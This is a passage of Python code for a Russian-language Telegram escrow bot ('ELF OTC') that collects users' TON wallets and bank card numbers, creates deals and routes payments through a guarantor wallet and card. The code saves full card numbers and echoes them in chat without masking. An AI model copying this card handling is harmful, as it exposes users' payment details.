            # Валидация TON-адреса (пример: 48 символов, латиница, цифры, _ и -)
            if re.fullmatch(r'[A-Za-z0-9_-]{48,64}', text):
                # Сохраняем кошелек используя новый метод
                self.set_user_wallet(user_id, text)
                self.user_states[user_id] = None
                confirm_text = f"✅ TON-кошелек успешно сохранен!\n\n💎 Ваш кошелек:\n`{text}`\n\nТеперь вы можете создавать и участвовать в сделках с TON."
                keyboard = [
                    [InlineKeyboardButton(texts['back_to_menu'], callback_data='back_to_menu')]
                ]
                try:
                    if os.path.exists(START_IMAGE_PATH):
                        with open(START_IMAGE_PATH, 'rb') as photo:
                            await update.message.reply_photo(
                                photo=photo,
                                caption=confirm_text,
                                parse_mode=ParseMode.MARKDOWN,
                                reply_markup=InlineKeyboardMarkup(keyboard)
                            )
                    else:
                        await update.message.reply_text(
                            confirm_text,
                            parse_mode=ParseMode.MARKDOWN,
                            reply_markup=InlineKeyboardMarkup(keyboard)
                        )
                except Exception as e:
                    logger.error(f"Error in confirm TON wallet: {e}")
            else:
                error_text = '❌ Неверный формат TON-кошелька! Попробуйте снова.\n\nПример правильного адреса:\n`UQAg5524ZdXGirNT79n4eaFiuiSzv1VivKnpVYDI6za0J_hz`'
                keyboard = [
                    [InlineKeyboardButton(texts['back_to_menu'], callback_data='back_to_menu')]
                ]
                await update.message.reply_text(
                    error_text,
                    parse_mode=ParseMode.MARKDOWN,
                    reply_markup=InlineKeyboardMarkup(keyboard)
                )
            return

        # Проверяем, ждет ли бот банковскую карту
        if state == 'waiting_bank_card':
            # Валидация номера карты (16 цифр с возможными пробелами)
            card_digits = re.sub(r'[^\d]', '', text)
            if len(card_digits) == 16:
                # Форматируем карту с пробелами
                formatted_card = f"{card_digits[:4]} {card_digits[4:8]} {card_digits[8:12]} {card_digits[12:]}"
                self.set_user_bank_card(user_id, formatted_card)
                self.user_states[user_id] = None
                confirm_text = f"✅ Банковская карта успешно сохранена!\n\n💳 Ваша карта:\n`{formatted_card}`\n\nТеперь вы можете создавать и участвовать в сделках с рублями."
                keyboard = [
                    [InlineKeyboardButton(texts['back_to_menu'], callback_data='back_to_menu')]
                ]
                try:
                    if os.path.exists(START_IMAGE_PATH):
                        with open(START_IMAGE_PATH, 'rb') as photo:
                            await update.message.reply_photo(
                                photo=photo,
                                caption=confirm_text,
                                parse_mode=ParseMode.MARKDOWN,
                                reply_markup=InlineKeyboardMarkup(keyboard)
                            )
                    else:
                        await update.message.reply_text(
                            confirm_text,
                            parse_mode=ParseMode.MARKDOWN,
                            reply_markup=InlineKeyboardMarkup(keyboard)
                        )
                except Exception as e:
                    logger.error(f"Error in confirm bank card: {e}")
            else:
                error_text = '❌ Неверный формат номера карты! Введите 16 цифр.\n\nПример: 2200 7000 0000 0000'
                keyboard = [
                    [InlineKeyboardButton(texts['back_to_menu'], callback_data='back_to_menu')]
                ]
                await update.message.reply_text(
                    error_text,
                    parse_mode=ParseMode.MARKDOWN,
                    reply_markup=InlineKeyboardMarkup(keyboard)
                )
            return

        # Шаг 1: Ввод суммы сделки (после выбора валюты)
        if isinstance(state, dict) and state.get('waiting_deal_amount'):
            # Проверяем формат суммы (например: 100.5)
            if re.fullmatch(r'\d+(\.\d{1,2})?', text):
                currency = state['currency']
                currency_symbol = 'TON' if currency == 'TON' else '₽'

                # Переходим к вводу описания
                self.user_states[user_id] = {'deal_amount': text, 'currency': currency}
                ask_desc = f'📝 Укажите, что вы предлагаете в этой сделке за {text} {currency_symbol}:\n\n💡 После создания сделки:\n• Покупатель переведет {text} {currency_symbol} гаранту\n• Вы отправите товар покупателю\n• Гарант переведет {text} {currency_symbol} на ваши реквизиты\n\nПример описания: 10 Кепок и Пепе'
                await update.message.reply_text(ask_desc)
            else:
                await update.message.reply_text('❌ Введите сумму в формате: 100.5')
            return

        # Шаг 2: Ввод описания сделки (после ввода суммы)
        if isinstance(state, dict) and 'deal_amount' in state and 'currency' in state:
            amount = state['deal_amount']
            currency = state['currency']
            description = text

            # Создаем сделку
            deal_id = self.create_deal(user_id, amount, description, currency)
            # Генерируем уникальную ссылку
            link = f'https://t.me/{context.bot.username}?start=deal_{deal_id}'
            currency_symbol = 'TON' if currency == 'TON' else '₽'
            deal_info = (
                '✅ Сделка успешно создана!\n\n'
                f'💰 Сумма: {amount} {currency_symbol}\n'
                f'💱 Валюта: {currency}\n'
                f'📝 Описание: {description}\n'
                f'🔗 Ссылка для покупателя:\n{link}\n\n'
                f'💼 Отправьте ссылку покупателю для начала сделки!'
            )
            keyboard = [
                [InlineKeyboardButton('❌ Отменить сделку', callback_data=f'cancel_deal_{deal_id}')],
                [InlineKeyboardButton(texts['back_to_menu'], callback_data='back_to_menu')]
            ]
            await update.message.reply_text(deal_info, reply_markup=InlineKeyboardMarkup(keyboard))
            self.user_states[user_id] = None
            return

    def load_deals_data(self):
        """Загрузить сделки из JSON файла"""
        try:
            if os.path.exists(DEALS_DATA_FILE):
                with open(DEALS_DATA_FILE, 'r', encoding='utf-8') as file:
                    self.deals = json.load(file)
            else:
                self.deals = {}
        except Exception as e:
            logger.error(f"Ошибка при загрузке сделок: {e}")
            self.deals = {}

    def save_deals_data(self):
        """Сохранить сделки в JSON файл"""
        try:
            with open(DEALS_DATA_FILE, 'w', encoding='utf-8') as file:
                json.dump(self.deals, file, ensure_ascii=False, indent=2)
        except Exception as e:
            logger.error(f"Ошибка при сохранении сделок: {e}")

    def create_deal(self, user_id, amount, description, currency='TON'):
        """Создать новую сделку и вернуть её ID"""
        deal_id = str(uuid.uuid4())
        deal = {
            'id': deal_id,
            'user_id': str(user_id),
            'amount': amount,
            'description': description,
            'currency': currency,
            'status': 'active',
            'buyer_id': None,  # ID участника, который вошел в сделку
        }
        self.deals[deal_id] = deal
        self.save_deals_data()
        return deal_id

    def get_deal(self, deal_id):
        return self.deals.get(deal_id)


def main():
    """Основная функция для запуска бота"""
    # Создаем экземпляр бота
    bot = ELFOTCBot()

    # Создаем приложение
    application = Application.builder().token(BOT_TOKEN).build()

    # Добавляем обработчики
    application.add_handler(CommandHandler("start", bot.start_command))
    application.add_handler(CallbackQueryHandler(bot.button_callback))
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, bot.text_message))

    # Запускаем бота
    print("🤖 ELF OTC Бот запущен!")
    print(f"🛡️ Кошелек гаранта (TON): {GUARANTOR_WALLET}")
    print(f"🛡️ Карта гаранта (RUB): {GUARANTOR_BANK_CARD}")
    print(f"👑 Привилегированных пользователей: {len(PRIVILEGED_USERS)}")
    application.run_polling(allowed_updates=Update.ALL_TYPES)


if __name__ == '__main__':
    main()
